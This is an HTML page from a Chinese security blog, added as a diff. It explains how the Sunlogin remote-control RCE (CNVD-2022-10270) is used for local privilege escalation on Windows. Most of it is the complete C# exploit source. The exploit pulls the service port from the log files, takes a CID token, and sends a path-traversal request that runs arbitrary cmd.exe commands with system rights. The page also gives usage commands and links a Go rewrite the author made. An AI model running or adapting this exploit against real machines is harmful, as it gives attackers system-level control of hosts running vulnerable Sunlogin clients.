@@ -1,0 +1,443 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>向日葵RCE后续利用之本地提权 | 6right</title>
+
+<link rel="shortcut icon" href="https://liangyueliangyue.github.io/favicon.ico?v=1686021349967">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://liangyueliangyue.github.io/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            6right
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/friends" class="menu gt-a-link">
+                    友链
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1686021349967"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    向日葵RCE后续利用之本地提权
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2022-02-27 ·
+                    </time>
+                    
+                        <a href="https://liangyueliangyue.github.io/tag/fhgWvQEMj/" class="post-tags">
+                            # 工具开发
+                        </a>
+                    
+                        <a href="https://liangyueliangyue.github.io/tag/qhrlgmGxH/" class="post-tags">
+                            # 内网渗透
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <p>根据玄武实验室的文章</p>
+<pre><code>https://github.com/Ryze-T/CNVD-2022-10270-LPE
+</code></pre>
+<p>找到目标日志文件</p>
+<pre><code>cd /d c:/
+dir /S sunlogin_service*
+</code></pre>
+<p>向日葵日志文件</p>
+<pre><code>sunlogin_service.20220226-171345.log
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://img-blog.csdnimg.cn/ab56b66bae1d4157bd25103d33ee1c15.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-0WP2Qs2X-1645930706971)(D:magesmage-20220226173249846.png)" loading="lazy"></figure>
+<h2 id="复现">复现</h2>
+<figure data-type="image" tabindex="2"><img src="https://img-blog.csdnimg.cn/79d30ea3dafb4e6a9eda441f706da933.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-Bpyv0gS2-1645930706972)(D:magesmage-20220226180307535.png)" loading="lazy"></figure>
+<p>安装.NET 4</p>
+<pre><code>https://www.microsoft.com/zh-cn/download/details.aspx?id=17718
+</code></pre>
+<p>在运行，发现需要指定路径路径，而我在win7下目录为</p>
+<pre><code>C:\ProgramData\Oray\SunloginClient\log
+</code></pre>
+<p>和默认不同所以需要自己指定（注意这里不带log）</p>
+<pre><code>sunloginLPE.exe whoami C:\ProgramData\Oray\SunloginClient
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://img-blog.csdnimg.cn/03571313e23948ceb57df66622dd1e65.png" alt="外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-X5Gijv9m-1645930706973)(D:magesmage-20220226204404312.png)" loading="lazy"></figure>
+<h2 id="代码分析">代码分析</h2>
+<pre><code class="language-cs">using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Text.RegularExpressions;
+using System.Net;
+
+namespace sunloginLPE
+{
+
+    internal class Program
+    {
+        static string GetLatestFiles(string Path, int count)
+        {
+            var query = (from f in Directory.GetFiles(Path)
+                         let fi = new FileInfo(f)
+                         orderby fi.CreationTime descending
+                         select fi.FullName).Take(count);
+            string[] files = query.ToArray();
+            for (int i = 0; i &lt; files.Length; i++)
+            {
+                if (files[i].Contains(&quot;sunlogin_service.&quot;))
+                {
+                    return files[i];
+                }
+            }
+            Console.WriteLine(&quot;[-] logFile not found&quot;);
+            return &quot;&quot;;
+        }
+        static string getPort(string path)
+        {
+            string logFile = GetLatestFiles(path + &quot;\\log&quot;, 2);
+            string port = &quot;&quot;;
+            string s;
+            if (logFile != &quot;&quot;)
+            {
+                FileStream fs = new FileStream(logFile, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
+                StreamReader sr = new StreamReader(fs, System.Text.Encoding.Default);
+                s  = sr.ReadToEnd();
+                string pattern = @&quot;\bstart listen OK\S*\,&quot;;
+                string pattern2 = @&quot;\d{5}&quot;;
+                string res = &quot;&quot;;
+                MatchCollection mc = Regex.Matches(s, pattern);
+                foreach (Match m in mc)
+                    res = m.Value;
+                MatchCollection mc2 = Regex.Matches(res, pattern2);
+                foreach (Match m2 in mc2)
+                    port = m2.Value;
+            }
+            return port;
+
+        }
+
+        private static String HttpGet(string url, string requestData)
+        {
+            // 实例化请求对象
+            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url + &quot;?&quot; + requestData);
+            request.Method = &quot;GET&quot;;
+            request.ContentType = &quot;text/html; charset=UTF-8&quot;;
+
+            // 实例化响应对象，获取响应信息
+            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
+            Stream responseStream = response.GetResponseStream();
+            StreamReader sReader = new StreamReader(responseStream, Encoding.Default);
+            String result = sReader.ReadToEnd();
+            sReader.Close();
+            responseStream.Close();
+            return result;
+        }
+
+        private static String HttpGetWithCookie(string url, string requestData,string cookie)
+        {
+            // 实例化请求对象
+            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url + &quot;?&quot; + requestData);
+            request.Method = &quot;GET&quot;;
+            request.ContentType = &quot;text/html; charset=UTF-8&quot;;
+            request.Headers.Add(&quot;Cookie&quot;, &quot;CID=&quot; + cookie);
+
+            // 实例化响应对象，获取响应信息
+            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
+            Stream responseStream = response.GetResponseStream();
+            StreamReader sReader = new StreamReader(responseStream, Encoding.Default);
+            String result = sReader.ReadToEnd();
+            sReader.Close();
+            responseStream.Close();
+            return result;
+        }
+        static string exp(string SunloginClient_port,string ExecCmd)
+        {
+            String targetUrl = &quot;http://127.0.0.1:&quot; + SunloginClient_port + &quot;/cgi-bin/rpc&quot;;
+            String response = HttpGet(targetUrl, &quot;action=verify-haras&quot;);
+            string pattern = &quot;verify_string\&quot;:\&quot;(\\w+)?\&quot;&quot;;
+            string cid = &quot;&quot;;
+            MatchCollection mc = Regex.Matches(response, pattern);
+            foreach (Match m in mc)
+                cid = m.Value;
+            cid = cid.Replace(&quot;\&quot;&quot;, &quot;&quot;).Replace(&quot;verify_string:&quot;, &quot;&quot;);
+            Console.WriteLine(&quot;[+] CID=&quot; +cid);
+
+            targetUrl = &quot;http://127.0.0.1:&quot; + SunloginClient_port + &quot;/check&quot;;
+            response = HttpGetWithCookie(targetUrl, &quot;cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows\\system32\\cmd.exe+/c+&quot; + ExecCmd.Replace(&quot; &quot;,&quot;+&quot;),cid);
+
+            return response;
+        }
+        static void Main(string[] args)
+        {
+            
+            Console.WriteLine(&quot;[!] Usage: sunloginLPE.exe Cmd [sunloginClientPath]（DefaultPath = C:\\Program Files\\Oray\\SunLogin\\SunloginClient）&quot;);
+            string defaultPath = &quot;C:\\Program Files\\Oray\\SunLogin\\SunloginClient&quot;;
+            string cmd = &quot;&quot;;
+            string path = defaultPath;
+            string port = &quot;&quot;;
+            if(args.Length  == 1)
+            {
+                cmd = args[0];
+            }
+            else if(args.Length == 2)
+            {
+                cmd=args[0];
+                path =args[1];
+            }
+            else
+            {
+                Console.WriteLine(&quot;[-] wrong number of parameters&quot;);
+                System.Environment.Exit(0);
+            }
+            try
+            {
+                port = getPort(path);
+                if(port != &quot;&quot;)
+                {
+                    Console.WriteLine(&quot;[+] SunloginClient port is &quot; + port);
+                }
+                else
+                {
+                    Console.WriteLine(&quot;[-] SunloginClient port not found&quot;);
+                    System.Environment.Exit(0);
+                }
+                Console.WriteLine(&quot;[+] 命令执行结果: \n&quot; + exp(port, cmd));
+            }
+            catch(Exception ex)
+            {
+                Console.WriteLine(&quot;[-] &quot; + ex.ToString());
+            }
+        }
+    }
+}
+</code></pre>
+<p>在111行Main函数中写死了路径，如果出现目录不同需要提供第二个参数</p>
+<pre><code class="language-c#">string defaultPath = &quot;C:\\Program Files\\Oray\\SunLogin\\SunloginClient&quot;;
+</code></pre>
+<p>所以程序其实只自动化了漏洞利用这一块，目录如果不是默认还是需要自己查询</p>
+<ul>
+<li>猜测应该是因为直接去自动化查找文件可能会被杀毒拦截，需要进行免杀所以通用性不高就没写</li>
+</ul>
+<h2 id="go程序编写">go程序编写</h2>
+<p>所以自己用go写一个直接一条龙服务（但是不免杀！）</p>
+<ul>
+<li>
+<p>首先确定程序功能</p>
+<ol>
+<li>查找进程查看是否存在向日葵进程（这里不确认进程名是否都一致）</li>
+<li>寻找日志文件从中提取出端口信息</li>
+<li>通过端口信息进行本地利用命令执行达到提权</li>
+</ol>
+</li>
+<li>
+<p>确认传参</p>
+<ul>
+<li>要执行的cmd命令</li>
+</ul>
+</li>
+</ul>
+<p>最后效果</p>
+<p><img src="https://img-blog.csdnimg.cn/9f632bb1884e40329385cc4e13be9936.png" alt="在这里插入图片描述" loading="lazy"><br>
+总的来说</p>
+<ul>
+<li>
+<p>首先先通过获取进程列表来确定本地是否存在向日葵进程</p>
+</li>
+<li>
+<p>如果存在就通过批处理寻找日志文件（自动化）</p>
+</li>
+<li>
+<p>然后第二步获取最新日志文件</p>
+<ul>
+<li>上面的程序直接调用 Directory.GetFiles方法通过创建时间来获取</li>
+<li>而我是基于上一步的日志文件通过比对得出的结果</li>
+</ul>
+</li>
+<li>
+<p>后续的凭证获取和命令执行还是一样</p>
+</li>
+</ul>
+<p>代码也放在了github，对于GO来说还是初学者，所以可能写的不是很好（尤其异常处理这一块还需要完善）</p>
+<pre><code>https://github.com/liangyueliangyue/sunlogin_rce
+</code></pre>
+<h2 id="后记">后记</h2>
+<p>因为是基于文件读取的前提进行命令执行，然后向日葵运行是在系统管理员权限，所以可以用来进行本地提权</p>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://liangyueliangyue.github.io/post/clash-dai-li-gong-ju-rce/" class="post-title gt-a-link">
+                    clash代理工具-RCE
+                </a>
+            </div>
+        
+
+        
+            <span id="/post/xiang-ri-kui-rce-hou-xu-li-yong-zhi-ben-di-ti-quan/" class="leancloud_visitors" data-flag-title="向日葵RCE后续利用之本地提权">
+                <em class="post-meta-item-text">阅读量 </em>
+                <i class="leancloud-visitors-count">0</i>
+            </span>
+        
+
+        
+
+        
+            <script src='https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js'></script>
+
+<style>
+	div#vcomments{
+		width:100%;
+		max-width: 1000px;
+		padding: 2.5%
+	}
+</style>
+
+
+	<div id="vcomments"></div>
+
+<script>
+	new Valine({
+		el: '#vcomments',
+		appId: 'QR1YL8ep02tLdNVejam0Whhv-gzGzoHsz',
+		appKey: 'I37Ekl4E78WEw4EpQ5WRlzxL',
+		avatar: 'monsterid',
+		pageSize: 5,
+		recordIp: false,
+		placeholder: '留下你的评论！',
+		visitor: true,
+	});
+</script>
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">温润如玉</div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/liangyueliangyue" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+    </div>
+    <div>
+        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
+                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://liangyueliangyue.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
